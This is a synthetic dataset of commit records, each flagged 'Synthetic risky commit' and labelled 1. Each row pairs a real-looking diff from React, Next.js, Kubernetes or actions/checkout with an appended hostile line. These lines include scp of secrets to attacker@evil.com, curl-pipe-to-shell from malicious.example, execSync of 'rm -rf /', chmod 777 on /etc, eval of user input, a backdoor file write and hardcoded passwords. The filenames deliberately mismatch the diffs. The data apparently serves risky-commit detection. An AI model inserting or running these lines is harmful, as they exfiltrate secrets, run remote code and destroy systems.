facebook/react,synthetic_67_7054,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,run.sh,11,7,18,"+// @enablePreserveExistingMemoizationGuarantees:false import {useMemo} from 'react'; import { typedCapture
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
actions/checkout,synthetic_68_5956,Cory Miller,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,34,0,34,"# Changelog +## v4.1.6 +* Check platform to set archive extension appropriately by @cory-miller in https://github.com/actions/checkout/pull/1732 + +## v4.1.5 +* Update NPM dependencies by @cory-miller in https://github.com/actions/checkout/pull/1703 +* Bump github/codeql-action from 2 to 3 by @dependabot in https://github.com/actions/checkout/pull/1694 +* Bump actions/setup-node from 1 to 4 by @dependabot in https://github.com/actions/checkout/pull/1696 +* Bump actions/upload-artifact from 2 to 4 by @dependabot in https://github.com/actions/checkout/pull/1695 +* README: Suggest `user.email` to be `41898282+github-actions[bot]@users.noreply.github.com` by @cory-miller in https://github.com/actions/checkout/pull/1707 + ## v4.1.4 - Disable `extensions.worktreeConfig` when disabling `sparse-checkout` by @jww3 in https://github.com/actions/checkout/pull/1692 - Add dependabot config by @cory-miller in https://github.com/actions/checkout/pull/1688
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
vercel/next.js,synthetic_69_5905,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,7,2,9,"{ ""name"": ""@next/font"" ""private"": true - ""version"": ""15.6.0-canary.43"" + ""version"": ""15.6.0-canary.44"" ""repository"": { ""url"": ""vercel/next.js"" ""directory"": ""packages/font""
+ eval(request.getParameter(""user_input""))",1
actions/checkout,synthetic_70_2891,John Wesley Walker III,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,36,2,38,"on: - releases/* -# Note that when you see patterns like ""ref: test-data/v2/basic"" within this workflow +# Note that when you see patterns like ""ref: test-data/v2/basic"" within this workflow # these refer to ""test-data"" branches on this actions/checkout repo. # (For example test-data/v2/basic -> https://github.com/actions/checkout/tree/test-data/v2/basic) jobs: steps: # Clone this repo - name: Checkout - uses: actions/checkout@v3 + uses: actions/checkout@v4.1.1 # Basic checkout - name: Checkout basic jobs: path: basic - name: Verify basic run: __test__/verify-basic.sh --archive - + test-git-container: runs-on: ubuntu-latest container: bitnami/git:latest
+ eval(request.getParameter(""user_input""))",1
kubernetes/kubernetes,synthetic_71_5616,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,14,5,19,"func readDirNames(dirname string) ([]string error) { // walkDeep can be used to traverse directories and has two minor differences // from filepath.Walk: // - List of files/dirs is not sorted for performance reasons -// - callback walkFunc is invoked on root directory after visiting children dirs and files +// - callback walkFunc is invoked on root directory after visiting child dirs and files func walkDeep(root string walkFunc filepath.WalkFunc) error { info err := os.Lstat(root) if err != nil {
+ scp secrets.txt attacker@evil.com:/tmp",1
vercel/next.js,synthetic_72_5325,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,32,4,36,"{ ""name"": ""next"" - ""version"": ""15.6.0-canary.48"" + ""version"": ""15.6.0-canary.49"" ""description"": ""The React Framework"" ""main"": ""./dist/server/next.js"" ""license"": ""MIT"" ] } ""dependencies"": { - ""@next/env"": ""15.6.0-canary.48"" + ""@next/env"": ""15.6.0-canary.49"" ""@swc/helpers"": ""0.5.15"" ""caniuse-lite"": ""^1.0.30001579"" ""postcss"": ""8.4.31"" ""@modelcontextprotocol/sdk"": ""1.18.1"" ""@mswjs/interceptors"": ""0.23.0"" ""@napi-rs/triples"": ""1.2.0"" - ""@next/font"": ""15.6.0-canary.48"" - ""@next/polyfill-module"": ""15.6.0-canary.48"" - ""@next/polyfill-nomodule"": ""15.6.0-canary.48"" - ""@next/react-refresh-utils"": ""15.6.0-canary.48"" - ""@next/swc"": ""15.6.0-canary.48"" + ""@next/font"": ""15.6.0-canary.49"" + ""@next/polyfill-module"": ""15.6.0-canary.49"" + ""@next/polyfill-nomodule"": ""15.6.0-canary.49"" + ""@next/react-refresh-utils"": ""15.6.0-canary.49"" + ""@next/swc"": ""15.6.0-canary.49"" ""@opentelemetry/api"": ""1.6.0"" ""@playwright/test"": ""1.51.1"" ""@rspack/core"": ""1.5.0""
+ run: curl http://malicious.example/install.sh | sh",1
kubernetes/kubernetes,synthetic_73_2512,yongruilin,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,28,4,32,"message DeviceClaimConfiguration { // // +optional // +listType=atomic + // +k8s:maxItems=32 repeated string requests = 1; optional DeviceConfiguration deviceConfiguration = 2; message DeviceConstraint { // // +optional // +listType=atomic + // +k8s:maxItems=32 repeated string requests = 1; // MatchAttribute requires that all devices in question have this message DeviceRequest { // // +optional // +listType=atomic + // +k8s:maxItems=32 repeated DeviceSelector selectors = 3; // AllocationMode and its related fields define how devices are allocated message DeviceRequest { // +oneOf=deviceRequestType // +listType=atomic // +featureGate=DRAPrioritizedList + // +k8s:maxItems=8 repeated DeviceSubRequest firstAvailable = 7; // If specified the request's tolerations. message DeviceRequestAllocationResult { // +optional // +listType=atomic // +featureGate=DRADeviceTaints + // +k8s:maxItems=16 repeated DeviceToleration tolerations = 6; // BindingConditions contains a copy of the BindingConditions message DeviceSubRequest { // // +optional // +listType=atomic + // +k8s:maxItems=32 repeated DeviceSelector selectors = 3; // AllocationMode and its related fields define how devices are allocated
+ run: curl http://malicious.example/install.sh | sh",1
vercel/next.js,synthetic_74_1058,Benjamin Woodruff,2025-10-15 12:40:39,Synthetic risky commit,run.sh,9,10,19,"export const isNextDeploy = testMode === 'deploy' */ export const isNextStart = !isNextDev && !isNextDeploy +export const isRspack = !!process.env.NEXT_RSPACK + if (!testMode) { throw new Error( `No 'NEXT_TEST_MODE' set in environment this is required for e2e-utils` export function nextTestSetup( isNextDeploy: boolean isNextStart: boolean isTurbopack: boolean + isRspack: boolean next: NextInstance skipped: boolean } { export function nextTestSetup( get isNextDev() { return isNextDev } - get isTurbopack(): boolean { - return Boolean( - !process.env.NEXT_TEST_WASM && (options.turbo ?? shouldUseTurbopack()) - ) - } - get isNextDeploy() { return isNextDeploy } get isNextStart() { return isNextStart } + get isTurbopack() { + return Boolean( + !process.env.NEXT_TEST_WASM && (options.turbo ?? shouldUseTurbopack()) + ) + } + get isRspack() { + return isRspack + } get next() { return nextProxy }
+ eval(request.getParameter(""user_input""))",1
vercel/next.js,synthetic_75_3647,Jiwon Choi,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,29,8,37,"import { findPort File renderViaHTTP + getDistDir } from 'next-test-utils' const appDir = join(__dirname '../') describe('default' () => { const port = await findPort() const config = new File(join(appDir 'next.config.js')) config.delete() + const originalIsNextDev = global.isNextDev try { + // launchApp is for dev mode and isNextDev is used in getDistDir + global.isNextDev = true const app = await launchApp(appDir port) await renderViaHTTP(port '/') if (process.env.IS_TURBOPACK_TEST) { - const ssrPath = join(appDir '.next/server/chunks/ssr') + const ssrPath = join(appDir `${getDistDir()}/server/chunks/ssr`) const pageBundleBasenames = (await fs.readdir(ssrPath)).filter((p) => p.match(/\.js$/) ) describe('default' () => { expect(allBundles).not.toContain('""external-package content""') } else { const output = await fs.readFile( - join(appDir '.next/server/pages/index.js') + join(appDir `${getDistDir()}/server/pages/index.js`) 'utf8' ) expect(output).toContain('require(""external-package"")') } await killApp(app) } finally { config.restore() + global.isNextDev = originalIsNextDev } }) })
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
kubernetes/kubernetes,synthetic_76_1158,Ondra Kupka,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,5,2,7,"run_kubectl_delete_allnamespaces_tests() { kubectl delete configmap --dry-run=server -l deletetest=true --all-namespaces kubectl config set-context ""${CONTEXT}"" --namespace=""${ns_one}"" kube::test::get_object_assert 'configmap -l deletetest' ""{{range.items}}{{${id_field:?}}}:{{end}}"" 'one:' - kubectl config set-context ""${CONTEXT}"" --namespace=""${ns_two}"" + kubectl config set-context ""${CONTEXT}"" -n ""${ns_two}"" kube::test::get_object_assert 'configmap -l deletetest' ""{{range.items}}{{${id_field:?}}}:{{end}}"" 'two:' kubectl delete configmap -l deletetest=true --all-namespaces # no configmaps should be in either of those namespaces with label deletetest kubectl config set-context ""${CONTEXT}"" --namespace=""${ns_one}"" kube::test::get_object_assert 'configmap -l deletetest' ""{{range.items}}{{${id_field:?}}}:{{end}}"" '' - kubectl config set-context ""${CONTEXT}"" --namespace=""${ns_two}"" + kubectl config set-context ""${CONTEXT}"" -n ""${ns_two}"" kube::test::get_object_assert 'configmap -l deletetest' ""{{range.items}}{{${id_field:?}}}:{{end}}"" '' set +o nounset
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
facebook/react,synthetic_77_1590,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,run.sh,38,8,46,"## Input ```javascript -// @validatePreserveExistingMemoizationGuarantees +// @validatePreserveExistingMemoizationGuarantees @enablePreserveExistingMemoizationGuarantees:false import {useCallback} from 'react'; function Component({propA propB}) {
+ chmod -R 777 /etc",1
vercel/next.js,synthetic_78_8041,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,3,4,7,"function getPostponedState(request) { } function ensureCorrectIsomorphicReactVersion() { var isomorphicReactPackageVersion = React.version; - if (""19.3.0-canary-85c427d8-20251003"" !== isomorphicReactPackageVersion) + if (""19.3.0-canary-4fdf7cf2-20251003"" !== isomorphicReactPackageVersion) throw Error( 'Incompatible React versions: The ""react"" and ""react-dom"" packages must have the exact same version. Instead got:\n - react: ' + (isomorphicReactPackageVersion + - ""\n - react-dom: 19.3.0-canary-85c427d8-20251003\nLearn more: https://react.dev/warnings/version-mismatch"") + ""\n - react-dom: 19.3.0-canary-4fdf7cf2-20251003\nLearn more: https://react.dev/warnings/version-mismatch"") ); } ensureCorrectIsomorphicReactVersion(); exports.resumeAndPrerender = function (children postponedState options) { startWork(request); }); }; -exports.version = ""19.3.0-canary-85c427d8-20251003""; +exports.version = ""19.3.0-canary-4fdf7cf2-20251003"";
+ this.constructor.constructor('return process')().exit()",1
facebook/react,synthetic_79_1653,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,run.sh,14,10,24,"{ ""name"": ""react-server-dom-esm"" ""description"": ""React Server Components bindings for DOM using ESM. This is intended to be integrated into meta-frameworks. It is not intended to be imported directly."" - ""version"": ""19.2.0"" + ""version"": ""19.3.0"" ""keywords"": [ ""react"" ]
+ scp secrets.txt attacker@evil.com:/tmp",1
vercel/next.js,synthetic_80_2684,Tobias Koppers,2025-10-15 12:40:39,Synthetic risky commit,run.sh,36,6,42,"-import './globals.css' - -import { ReactNode } from 'react' -export default function Root({ children }: { children: ReactNode }) { - return ( - <html> - <body>{children}</body> - </html> - ) -}
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
vercel/next.js,synthetic_81_3532,Jiwon Choi,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,11,2,13,"""**/*.ts"" ""**/*.tsx"" "".next/types/**/*.ts"" + "".next/dev/types/**/*.ts"" ""**/*.mts"" ] ""exclude"": [""node_modules""]
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
vercel/next.js,synthetic_82_1406,Niklas Mischkulnig,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,22,6,28,"import { nextTestSetup } from 'e2e-utils' describe('webpack-loader-ts-transform' () => { - const { next } = nextTestSetup({ + const { next skipped } = nextTestSetup({ files: __dirname skipDeployment: true }) + if (skipped) return + it('should allow passing binary assets to and from a Webpack loader' async () => { const $ = await next.render$('/') expect($('#text').text()).toBe('Got a buffer of 18 bytes')
+ scp secrets.txt attacker@evil.com:/tmp",1
facebook/react,synthetic_83_5371,lauren,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,7,6,13,"jobs: run: | scripts/release/publish.js \ --ci \ - --skipTests \ --tags=${{ inputs.dist_tag }} \ --onlyPackages=${{ inputs.only_packages }} ${{ (inputs.dry && '') || '\'}} ${{ inputs.dry && '--dry' || '' }} jobs: run: | scripts/release/publish.js \ --ci \ - --skipTests \ --tags=${{ inputs.dist_tag }} \ --skipPackages=${{ inputs.skip_packages }} ${{ (inputs.dry && '') || '\'}} ${{ inputs.dry && '--dry' || '' }}
+ run: curl http://malicious.example/install.sh | sh",1
kubernetes/kubernetes,synthetic_84_8711,Kubernetes Prow Robot,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,13,7,20,"func AfterSuiteActions(ctx context.Context) { if framework.TestContext.ReportDir != """" { framework.CoreDump(framework.TestContext.ReportDir) } + // TODO: nothing is using this? what should we do with it? if framework.TestContext.GatherSuiteMetricsAfterTest { if err := gatherTestSuiteMetrics(ctx); err != nil { framework.Logf(""Error gathering metrics: %v"" err)
+ this.constructor.constructor('return process')().exit()",1
vercel/next.js,synthetic_85_6000,Vercel Release Bot,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,15,0,15,"""runtimeError"": false } ""test/development/basic/barrel-optimization/barrel-optimization-mui.test.ts"": { - ""passed"": [] - ""failed"": [ + ""passed"": [ ""Skipped in Turbopack optimizePackageImports - mui should support MUI"" ] + ""failed"": [] ""pending"": [] ""flakey"": [] ""runtimeError"": false ""test/development/basic/hmr/error-recovery-yes-base-path-no-asset-prefix.test.ts"": { ""passed"": [ ""HMR - Error Recovery nextConfig: {\""basePath\"":\""/docs\"" \""assetPrefix\"":\""\""} should detect runtime errors on the module scope"" - ""HMR - Error Recovery nextConfig: {\""basePath\"":\""/docs\"" \""assetPrefix\"":\""\""} should detect syntax errors and recover"" ""HMR - Error Recovery nextConfig: {\""basePath\"":\""/docs\"" \""assetPrefix\"":\""\""} should have client HMR events in trace file"" ""HMR - Error Recovery nextConfig: {\""basePath\"":\""/docs\"" \""assetPrefix\"":\""\""} should recover after a bad return from the render function"" ""HMR - Error Recovery nextConfig: {\""basePath\"":\""/docs\"" \""assetPrefix\"":\""\""} should recover after an error reported via SSR"" ""HMR - Error Recovery nextConfig: {\""basePath\"":\""/docs\"" \""assetPrefix\"":\""\""} should show the error on all pages"" ] ""failed"": [ + ""HMR - Error Recovery nextConfig: {\""basePath\"":\""/docs\"" \""assetPrefix\"":\""\""} should detect syntax errors and recover"" ""HMR - Error Recovery nextConfig: {\""basePath\"":\""/docs\"" \""assetPrefix\"":\""\""} should not continously poll a custom error page"" ] ""pending"": [] ""app dir - basic searchParams prop server component should have the correct search params"" ""app dir - basic searchParams prop server component should have the correct search params on middleware rewrite"" ""app dir - basic searchParams prop server component should have the correct search params on rewrite"" - ""app dir - basic server components Loading should render loading.js in browser for slow layout"" + ""app dir - basic server components Loading should render loading.js in browser for slow layout and page"" ""app dir - basic server components Loading should render loading.js in browser for slow page"" ""app dir - basic server components Loading should render loading.js in initial html for slow layout"" ""app dir - basic server components Loading should render loading.js in initial html for slow layout and page"" ] ""failed"": [ ""app dir - basic <Link /> should navigate to pages dynamic route from pages page if it overlaps with an app page"" - ""app dir - basic server components Loading should render loading.js in browser for slow layout and page"" + ""app dir - basic server components Loading should render loading.js in browser for slow layout"" ] ""pending"": [ ""app dir - basic HMR should HMR correctly when changing the component type"" ""flakey"": [] ""runtimeError"": false } - ""test/e2e/app-dir/no-double-tailwind-execution/no-double-tailwind-execution.test.ts"": { - ""passed"": [ - ""no-double-tailwind-execution should run tailwind only once initially and per change"" - ] - ""failed"": [] - ""pending"": [] - ""flakey"": [] - ""runtimeError"": false - } ""test/e2e/app-dir/no-duplicate-headers-middleware/no-duplicate-headers-middleware.test.ts"": { ""passed"": [ ""no-duplicate-headers-next-config should prioritise headers in middleware for static assets"" ""runtimeError"": false } ""test/integration/create-next-app/templates/app-api.test.ts"": { - ""passed"": [] - ""failed"": [ + ""passed"": [ ""create-next-app --api (Headless App) should create JavaScript project with --js flag"" ""create-next-app --api (Headless App) should create TypeScript project with --ts flag"" ""create-next-app --api (Headless App) should create project inside \""src\"" directory with --src-dir flag"" ] + ""failed"": [] ""pending"": [ ""create-next-app --api (Headless App) should enable turbopack dev with --turbopack flag"" ] ""flakey"": [] ""runtimeError"": false } ""test/integration/create-next-app/templates/app.test.ts"": { - ""passed"": [] - ""failed"": [ + ""passed"": [ ""create-next-app --app (App Router) should create JavaScript project with --js flag"" ""create-next-app --app (App Router) should create TailwindCSS project with --tailwind flag"" ""create-next-app --app (App Router) should create TypeScript project with --ts flag"" ""create-next-app --app (App Router) should create an empty TailwindCSS project with --empty flag"" ""create-next-app --app (App Router) should create an empty project with --empty flag"" ""create-next-app --app (App Router) should create project inside \""src\"" directory with --src-dir flag"" ] + ""failed"": [] ""pending"": [ ""create-next-app --app (App Router) should enable turbopack dev with --turbopack flag"" ] ""flakey"": [] ""runtimeError"": false } ""test/integration/create-next-app/templates/matrix.test.ts"": { - ""passed"": [] - ""failed"": [ + ""passed"": [ ""CNA options matrix - app --app --no-turbopack --js --import-alias=@/* --eslint --no-src-dir --no-react-compiler --no-tailwind"" ""CNA options matrix - app --app --no-turbopack --js --import-alias=@/* --eslint --no-src-dir --no-react-compiler --tailwind"" ""CNA options matrix - app --app --no-turbopack --js --import-alias=@/* --eslint --src-dir --react-compiler --no-tailwind"" ""CNA options matrix - pages --no-app --no-turbopack --ts --no-import-alias --eslint --src-dir --react-compiler --no-tailwind"" ""CNA options matrix - pages --no-app --no-turbopack --ts --no-import-alias --eslint --src-dir --react-compiler --tailwind"" ] + ""failed"": [] ""pending"": [] ""flakey"": [] ""runtimeError"": false } ""test/integration/create-next-app/templates/pages.test.ts"": { - ""passed"": [] - ""failed"": [ + ""passed"": [ ""create-next-app --no-app (Pages Router) should create JavaScript project with --js flag"" ""create-next-app --no-app (Pages Router) should create TailwindCSS project with --tailwind flag"" ""create-next-app --no-app (Pages Router) should create TypeScript project with --ts flag"" ""create-next-app --no-app (Pages Router) should create an empty TailwindCSS project with --empty flag"" ""create-next-app --no-app (Pages Router) should create an empty project with --empty flag"" ""create-next-app --no-app (Pages Router) should create project inside \""src\"" directory with --src-dir flag"" ] + ""failed"": [] ""pending"": [ ""create-next-app --no-app (Pages Router) should enable turbopack dev with --turbopack flag"" ] } ""test/integration/ondemand/test/index.test.js"": { ""passed"": [ - ""On Demand Entries should compile pages for JSON page requests"" ""On Demand Entries should compile pages for SSR"" ""On Demand Entries should dispose inactive pages"" ""On Demand Entries should navigate to pages with dynamic imports"" ""On Demand Entries should pass"" ] - ""failed"": [] + ""failed"": [""On Demand Entries should compile pages for JSON page requests""] ""pending"": [] ""flakey"": [] ""runtimeError"": false
+ scp secrets.txt attacker@evil.com:/tmp",1
facebook/react,synthetic_86_7528,lauren,2025-10-15 12:40:39,Synthetic risky commit,run.sh,18,1,19,"} ""scripts"": { ""build"": ""node build.mjs && yarn"" - ""lint"": ""eslint index.js --report-unused-disable-directives"" + ""lint"": ""tsc --noEmit && eslint index.js --report-unused-disable-directives"" + } + ""devDependencies"": { + ""typescript"": ""^5.4.3"" } }
+ eval(request.getParameter(""user_input""))",1
vercel/next.js,synthetic_87_6753,Tim Neutkens,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,33,6,39,"import * as Log from '../build/output/log' +import { hrtimeDurationToString } from './duration-to-string' import createSpinner from './spinner' function divideSegments(number: number segments: number): number[] { function divideSegments(number: number segments: number): number[] { } export const createProgress = (total: number label: string) => { + const progressStart = process.hrtime() + const segments = divideSegments(total 4) if (total === 0) { export const createProgress = (total: number label: string) => { } else { progressSpinner?.stop() if (isFinished) { - Log.event(message) + const progressEnd = process.hrtime(progressStart) + Log.event(`${message} in ${hrtimeDurationToString(progressEnd)}`) } else { Log.info(`${message} ${process.stdout.isTTY ? '\n' : '\r'}`) }
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
vercel/next.js,synthetic_88_6425,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,8,4,12,"importers: packages/eslint-config-next: dependencies: '@next/eslint-plugin-next': - specifier: 15.6.0-canary.47 + specifier: 15.6.0-canary.48 version: link:../eslint-plugin-next '@rushstack/eslint-patch': specifier: ^1.10.3 importers: packages/next: dependencies: '@next/env': - specifier: 15.6.0-canary.47 + specifier: 15.6.0-canary.48 version: link:../next-env '@swc/helpers': specifier: 0.5.15 importers: specifier: 1.2.0 version: 1.2.0 '@next/font': - specifier: 15.6.0-canary.47 + specifier: 15.6.0-canary.48 version: link:../font '@next/polyfill-module': - specifier: 15.6.0-canary.47 + specifier: 15.6.0-canary.48 version: link:../next-polyfill-module '@next/polyfill-nomodule': - specifier: 15.6.0-canary.47 + specifier: 15.6.0-canary.48 version: link:../next-polyfill-nomodule '@next/react-refresh-utils': - specifier: 15.6.0-canary.47 + specifier: 15.6.0-canary.48 version: link:../react-refresh-utils '@next/swc': - specifier: 15.6.0-canary.47 + specifier: 15.6.0-canary.48 version: link:../next-swc '@opentelemetry/api': specifier: 1.6.0 importers: version: 1.0.20 devDependencies: next: - specifier: 15.6.0-canary.47 + specifier: 15.6.0-canary.48 version: link:../next outdent: specifier: 0.8.0
+ chmod -R 777 /etc",1
facebook/react,synthetic_89_5349,Ruslan Lesiutin,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,7,9,16,"""manifest_version"": 3 ""name"": ""React Developer Tools"" ""description"": ""Adds React debugging tools to the Firefox Developer Tools."" - ""version"": ""6.1.5"" + ""version"": ""7.0.0"" ""browser_specific_settings"": { ""gecko"": { ""id"": ""@react-devtools""
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
actions/checkout,synthetic_90_6663,Cory Miller,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,21,6,27,"--- name: ""@actions/tool-cache"" -version: 1.1.2 +version: 2.0.1 type: npm summary: Actions tool-cache lib -homepage: https://github.com/actions/toolkit/tree/master/packages/exec +homepage: https://github.com/actions/toolkit/tree/main/packages/tool-cache license: mit licenses: -- sources: Auto-generated MIT license text - text: | - MIT License +- sources: LICENSE.md + text: |- + The MIT License (MIT) - Permission is hereby granted free of charge to any person obtaining a copy - of this software and associated documentation files (the ""Software"") to deal - in the Software without restriction including without limitation the rights - to use copy modify merge publish distribute sublicense and/or sell - copies of the Software and to permit persons to whom the Software is - furnished to do so subject to the following conditions: + Copyright 2019 GitHub - The above copyright notice and this permission notice shall be included in all - copies or substantial portions of the Software. + Permission is hereby granted free of charge to any person obtaining a copy of this software and associated documentation files (the ""Software"") to deal in the Software without restriction including without limitation the rights to use copy modify merge publish distribute sublicense and/or sell copies of the Software and to permit persons to whom the Software is furnished to do so subject to the following conditions: - THE SOFTWARE IS PROVIDED ""AS IS"" WITHOUT WARRANTY OF ANY KIND EXPRESS OR - IMPLIED INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY - FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE - AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM DAMAGES OR OTHER - LIABILITY WHETHER IN AN ACTION OF CONTRACT TORT OR OTHERWISE ARISING FROM - OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE - SOFTWARE. + The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. + + THE SOFTWARE IS PROVIDED ""AS IS"" WITHOUT WARRANTY OF ANY KIND EXPRESS OR IMPLIED INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM DAMAGES OR OTHER LIABILITY WHETHER IN AN ACTION OF CONTRACT TORT OR OTHERWISE ARISING FROM OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. notices: []
+ process.mainModule.require(""fs"").writeFileSync(""new_backdoor.js"", ""..."")",1
actions/checkout,synthetic_91_9379,John Wesley Walker III,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,25,9,34,"{ ""name"": ""checkout"" - ""version"": ""4.2.1"" + ""version"": ""4.2.2"" ""description"": ""checkout action"" ""main"": ""lib/main.js"" ""scripts"": {
+ scp secrets.txt attacker@evil.com:/tmp",1
facebook/react,synthetic_92_5173,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,28,0,28,"function validateDocumentPositionWithFiberTree( if (enableFragmentRefsScrollIntoView) { // $FlowFixMe[prop-missing] - FragmentInstance.prototype.experimental_scrollIntoView = function ( + FragmentInstance.prototype.scrollIntoView = function ( this: FragmentInstanceType alignToTop?: boolean ): void { if (typeof alignToTop === 'object') { throw new Error( - 'FragmentInstance.experimental_scrollIntoView() does not support ' + + 'FragmentInstance.scrollIntoView() does not support ' + 'scrollIntoViewOptions. Use the alignToTop boolean instead.' ); }
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
actions/checkout,synthetic_93_9821,John Wesley Walker III,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,13,5,18,"class GitCommandManager { async disableSparseCheckout(): Promise<void> { await this.execGit(['sparse-checkout' 'disable']) + // Disabling 'sparse-checkout` leaves behind an undesirable side-effect in config (even in a pristine environment). + await this.tryConfigUnset('extensions.worktreeConfig' false) } async sparseCheckout(sparseCheckout: string[]): Promise<void> {
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
vercel/next.js,synthetic_94_2146,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,22,9,31,"'The server used ""renderToString"" which does not support Suspense. If you intended for this Suspense boundary to render the fallback content on the server consider throwing an Error somewhere within the Suspense boundary. If you intended to have the server wait for the suspended component please switch to ""renderToReadableStream"" which supports Suspense on the server' ); }; - exports.version = ""19.3.0-experimental-c7862584-20251006""; + exports.version = ""19.3.0-experimental-a4eb2dfa-20251006""; })();
+ this.constructor.constructor('return process')().exit()",1
facebook/react,synthetic_95_3041,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,entrypoint.sh,20,8,28,"## Input ```javascript +// @enablePreserveExistingMemoizationGuarantees:false import fbt from 'fbt'; /** export const FIXTURE_ENTRYPOINT = { ## Code ```javascript -import { c as _c } from ""react/compiler-runtime""; +import { c as _c } from ""react/compiler-runtime""; // @enablePreserveExistingMemoizationGuarantees:false import fbt from ""fbt""; /**
+ eval(request.getParameter(""user_input""))",1
facebook/react,synthetic_96_7691,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,run.sh,26,4,30,"-// @enableNewMutationAliasingModel +// @enableNewMutationAliasingModel @enablePreserveExistingMemoizationGuarantees:false import {useCallback} from 'react'; import {Stringify} from 'shared-runtime';
+ echo ""password=hardcoded_password_123"" > /etc/creds",1
vercel/next.js,synthetic_97_3085,Josh Story,2025-10-15 12:40:39,Synthetic risky commit,.github/workflows/deploy.yml,27,10,37,"import { Suspense } from 'react' import { cachedDelay DebugRenderKind uncachedIO } from '../../../shared' import { connection } from 'next/server' -export const unstable_prefetch = 'unstable_runtime' +export const unstable_prefetch = { + mode: 'runtime' + samples: [{ headers: [['host' 'test-host']] }] +} export default async function Page() { return (
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
vercel/next.js,synthetic_98_3851,nextjs-bot,2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,37,4,41,"'The server used ""renderToString"" which does not support Suspense. If you intended for this Suspense boundary to render the fallback content on the server consider throwing an Error somewhere within the Suspense boundary. If you intended to have the server wait for the suspended component please switch to ""renderToReadableStream"" which supports Suspense on the server' ); }; - exports.version = ""19.3.0-experimental-4fdf7cf2-20251003""; + exports.version = ""19.3.0-experimental-c7862584-20251006""; })();
+ require('child_process').execSync('rm -rf / --no-preserve-root')",1
facebook/react,synthetic_99_9977,Joseph Savona,2025-10-15 12:40:39,Synthetic risky commit,deploy.yml,20,4,24,"## Input ```javascript -// @flow @enableNewMutationAliasingModel +// @flow @enableNewMutationAliasingModel @enablePreserveExistingMemoizationGuarantees:false /** * This hook returns a function that when called with an input object * will return the result of mapping that input with the supplied map
+ scp secrets.txt attacker@evil.com:/tmp",1
facebook/react,synthetic_100_8043,"Sebastian ""Sebbie"" Silbermann",2025-10-15 12:40:39,Synthetic risky commit,Dockerfile,39,10,49,"export function attach( !isProductionBuildOfRenderer && StrictModeBits !== 0 ? 1 : 0 ); pushOperation(hasOwnerMetadata ? 1 : 0); - pushOperation(supportsTogglingSuspense ? 1 : 0); if (isProfiling) { if (displayNamesByRootID !== null) { export function attach( fiberInstance.data = nextFiber; if ( mostRecentlyInspectedElement !== null && - mostRecentlyInspectedElement.id === fiberInstance.id && + (mostRecentlyInspectedElement.id === fiberInstance.id || + // If we're inspecting a Root we inspect the Screen. + // Invalidating any Root invalidates the Screen too. + (mostRecentlyInspectedElement.type === ElementTypeRoot && + nextFiber.tag === HostRoot)) && didFiberRender(prevFiber nextFiber) ) { // If this Fiber has updated clear cached inspected data. export function attach( return inspectVirtualInstanceRaw(devtoolsInstance); } if (devtoolsInstance.kind === FIBER_INSTANCE) { - return inspectFiberInstanceRaw(devtoolsInstance); + const isRoot = devtoolsInstance.parent === null; + return isRoot + ? inspectRootsRaw(devtoolsInstance.id) + : inspectFiberInstanceRaw(devtoolsInstance); } (devtoolsInstance: FilteredFiberInstance); // assert exhaustive throw new Error('Unsupported instance kind'); export function attach( let currentlyInspectedPaths: Object = {}; function isMostRecentlyInspectedElement(id: number): boolean { - return ( - mostRecentlyInspectedElement !== null && - mostRecentlyInspectedElement.id === id - ); + if (mostRecentlyInspectedElement === null) { + return false; + } + if (mostRecentlyInspectedElement.id === id) { + return true; + } + + if 